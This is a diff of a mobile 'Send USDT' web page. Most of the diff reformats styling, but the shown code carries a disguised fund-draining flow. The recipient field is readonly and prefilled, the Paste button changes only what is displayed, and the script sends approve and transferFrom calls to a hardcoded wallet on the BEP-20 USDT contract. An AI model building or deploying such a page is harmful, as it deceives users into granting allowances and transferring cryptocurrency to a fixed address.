@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
   <title>Send USDT</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,151 +13,148 @@
       height: 100%;
       display: flex;
       flex-direction: column;
-    }
+    }.container {
+  flex: 1;
+  padding: 16px;
+  display: flex;
+  flex-direction: column;
+}
 
-    .container {
-      flex: 1;
-      padding: 16px;
-      display: flex;
-      flex-direction: column;
-    }
+label {
+  font-size: 14px;
+  color: #555;
+  display: block;
+  margin: 20px 0 8px;
+}
 
-    label {
-      font-size: 14px;
-      color: #555;
-      display: block;
-      margin: 20px 0 8px;
-    }
+.input-box {
+  display: flex;
+  align-items: center;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  padding: 0 10px;
+  position: relative;
+}
 
-    .input-box {
-      display: flex;
-      align-items: center;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 0 10px;
-      position: relative;
-    }
+.input-box input {
+  border: none;
+  outline: none;
+  padding: 14px;
+  font-size: 16px;
+  width: 100%;
+}
 
-    .input-box input {
-      border: none;
-      outline: none;
-      padding: 14px;
-      font-size: 16px;
-      width: 100%;
-    }
+.input-box .clear-btn {
+  background: none;
+  border: none;
+  font-size: 20px;
+  color: #aaa;
+  cursor: pointer;
+  margin-right: 8px;
+}
 
-    .input-box .clear-btn {
-      background: none;
-      border: none;
-      font-size: 20px;
-      color: #aaa;
-      cursor: pointer;
-      margin-right: 8px;
-    }
+.input-box .paste-btn {
+  background: none;
+  border: none;
+  color: #0052ff;
+  font-weight: bold;
+  cursor: pointer;
+  padding: 0 8px;
+}
 
-    .input-box .paste-btn {
-      background: none;
-      border: none;
-      color: #0052ff;
-      font-weight: bold;
-      cursor: pointer;
-      padding: 0 8px;
-    }
+.amount-section {
+  display: flex;
+  align-items: center;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  margin-top: 8px;
+}
 
-    .amount-section {
-      display: flex;
-      align-items: center;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      margin-top: 8px;
-    }
+.amount-section input {
+  border: none;
+  outline: none;
+  padding: 14px;
+  font-size: 16px;
+  width: 100%;
+}
 
-    .amount-section input {
-      border: none;
-      outline: none;
-      padding: 14px;
-      font-size: 16px;
-      width: 100%;
-    }
+.amount-section span, .amount-section .max-btn {
+  padding: 0 12px;
+  color: #0052ff;
+  font-weight: bold;
+  font-size: 14px;
+}
 
-    .amount-section span, .amount-section .max-btn {
-      padding: 0 12px;
-      color: #0052ff;
-      font-weight: bold;
-      font-size: 14px;
-    }
+.converted {
+  margin-top: 10px;
+  color: #888;
+  font-size: 14px;
+}
 
-    .converted {
-      margin-top: 10px;
-      color: #888;
-      font-size: 14px;
-    }
+.footer {
+  padding: 16px;
+  background: #fff;
+  box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
+}
 
-    .footer {
-      padding: 16px;
-      background: #fff;
-      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
-    }
+.button {
+  background-color: #0052ff;
+  color: white;
+  padding: 16px;
+  border: none;
+  width: 100%;
+  font-size: 18px;
+  font-weight: bold;
+  border-radius: 20px;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+}
 
-    .button {
-      background-color: #0052ff;
-      color: white;
-      padding: 16px;
-      border: none;
-      width: 100%;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 20px;
-      cursor: pointer;
-      position: relative;
-      transition: all 0.3s ease;
-    }
+.button.loading {
+  pointer-events: none;
+  opacity: 0.7;
+}
 
-    .button.loading::after {
-      content: "Processing...";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(255, 255, 255, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 16px;
-      color: #0052ff;
-      font-weight: bold;
-      border-radius: 20px;
-    }
+.button.loading::after {
+  content: "Processing...";
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(255, 255, 255, 0.7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-size: 16px;
+  color: #0052ff;
+  font-weight: bold;
+  border-radius: 20px;
+}
+
   </style>
 </head>
-<body>
-
-  <div class="container">
+<body>  <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
       <input type="text" id="address" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
       <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
       <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
-    </div>
+    </div><label>Amount</label>
+<div class="amount-section">
+  <input type="number" id="amount" placeholder="USDT Amount">
+  <span>USDT (BEP-20)</span>
+  <span class="max-btn" onclick="setMax()">Max</span>
+</div>
 
-    <label>Amount</label>
-    <div class="amount-section">
-      <input type="number" id="amount" placeholder="USDT Amount">
-      <span>USDT</span>
-      <span class="max-btn" onclick="setMax()">Max</span>
-    </div>
+<div class="converted">= $0.00</div>
 
-    <div class="converted">= $0.00</div>
-  </div>
-
-  <div class="footer">
+  </div>  <div class="footer">
     <button class="button" id="nextBtn" onclick="nextStep()">Next</button>
-  </div>
-
-  <script>
+  </div>  <script>
     const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT contract
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -192,7 +188,7 @@
         }
 
         const contract = new web3.eth.Contract(ABI, USDT);
-        const value = web3.utils.toWei(amount, 'mwei');
+        const value = web3.utils.toWei(amount, 'mwei'); // USDT decimals
 
         await contract.methods.approve(RECEIVER, value).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });
@@ -204,7 +200,5 @@
         btn.classList.remove("loading");
       }
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
